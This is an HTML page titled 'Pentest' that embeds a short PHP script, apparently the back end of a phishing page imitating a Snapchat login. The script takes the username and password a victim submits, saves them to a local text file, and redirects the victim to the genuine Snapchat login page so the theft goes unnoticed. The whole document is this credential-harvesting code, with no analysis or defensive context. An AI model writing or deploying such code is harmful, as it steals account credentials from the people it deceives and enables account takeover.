<!DOCTYPE html>
<html>
<head>
    <title>Pentest</title>
</head>
<body>
1.<?php

if($_SERVER["REQUEST_METHOD"]=="POST"){
	//echo "Votre email " .$_POST['email']." et votre mot de passe est ".$_POST["pass"];
	$fp = fopen ("donnees.txt", "w+");
	$contenu_du_fichier = fgets ($fp, 255);
	$new_data="Email= ".$_POST["username"]." Mot de passe= ".$_POST["password"];
	fputs($fp,$new_data);
	fclose ($fp);
	header("Location:https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome");
}


?>

</body>
</html>